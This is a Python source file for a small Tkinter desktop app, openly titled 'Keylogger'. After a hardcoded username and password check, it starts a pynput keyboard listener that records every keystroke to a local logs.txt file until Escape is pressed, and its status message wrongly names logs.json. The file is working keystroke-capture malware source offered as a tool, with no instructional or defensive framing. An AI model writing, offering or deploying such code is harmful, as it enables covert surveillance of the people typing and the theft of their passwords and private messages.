from tkinter import *
import tkinter as tk
from PIL import ImageTk, Image 
from tkinter import messagebox
from tkinter.scrolledtext import ScrolledText
from pynput import *
from pynput.keyboard import Key,Listener

root = tk.Tk()

key_strokes=""

def update_txt_file(key):
    with open('logs.txt',"w+") as key_stroke:
        key_stroke.write(key) 

#######################################################

# ON_PRESS FUNCTION  
def on_press(key):
    global key_strokes
    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

#######################################################

# BUTTON ACTION ON STRART FUNCTION
def butaction():
    print("{+} running keylogger successful!\n{!} saving the keys in logs.json")
    with keyboard.Listener(on_press=on_press, on_release = on_release) as listener:
        listener.join()

########################################################

# ON PRESS OF KEY ESCAPE RETURN
def on_release(key):
    if key == Key.esc:
        return False

########################################################

# LOGIN FOR ROOT USER
def Login():
        e = email.get()
        p = password.get() 

        if e == 'user' and p == "password" :
            root = tk.Tk()
            root.geometry('500x400')

            def Logout():
                root.destroy()
                
            header1 = Label(root,bg="black",width=300,height=2)
            header1.place(x=0,y=0)

            h2 = Label(root,text="keylogger",bg="black",fg="light green",font= ('verdana',13,'bold'))
            h2.place(x=175,y=5)
                                
            logout = Button(root,text="Logout",padx=20,bg="grey",fg = "red", relief=RIDGE,borderwidth=1,font= ('verdana',10,'bold'),cursor="hand2",command=Logout)
            logout.place(x=390,y=38)


            Button(root,text="START!!",padx=30,relief=RIDGE,borderwidth=1,bg="black",fg= "light green",font= ('verdana',10,'bold'),cursor="hand2",command = butaction).place(x=120,y=100)

            def stop():
                root.destroy()
            Button(root,text="EXIT!!",padx=30,relief=RIDGE,borderwidth=1,bg="black",fg= "light green",font= ('verdana',10,'bold'),cursor="hand2",command = stop).place(x=250,y=100)
            m = Label(root,text="keylogger running ...",font= ('verdana',10,'bold'))
            m.place(x=130,y=150)            
            root.mainloop()

        else:
            messagebox.showerror('Login error',"PLease Write the Valid Email and Password..User not authorized!!")            


# MAIN 
root.title('KeyLogger')
root.geometry('400x300')
root.maxsize(400,300)
root.minsize(400,300)

header = Label(root,bg="black",width=300,height=2)
header.place(x=0,y=0)

h1 = Label(root,text="Keylogger",bg="black",fg="light green",font= ('verdana',13,'bold'))
h1.place(x=150,y=5)

#img = ImageTk.PhotoImage(Image.open('gmail.png'))

#logo = Label(root,image=img,borderwidth=0)
#logo.place(x=170,y=50)


e = Label(root,text="UserName",font= ('verdana',10,'bold'))
e.place(x=10,y=100)
email = Entry(root,width=30,relief=RIDGE,borderwidth=3)
email.place(x=10,y=120)



p = Label(root,text="Password",font= ('verdana',10,'bold'))
p.place(x=10,y=160)
password = Entry(root,width=30,relief=RIDGE,borderwidth=3)
password.place(x=10,y=180)


login = Button(root,text="Login",padx=30,bg="black",fg = "white", relief=RIDGE,borderwidth=1,font= ('verdana',10,'bold'),cursor="hand2",command=Login)
login.place(x=10,y=240)


root.mainloop()
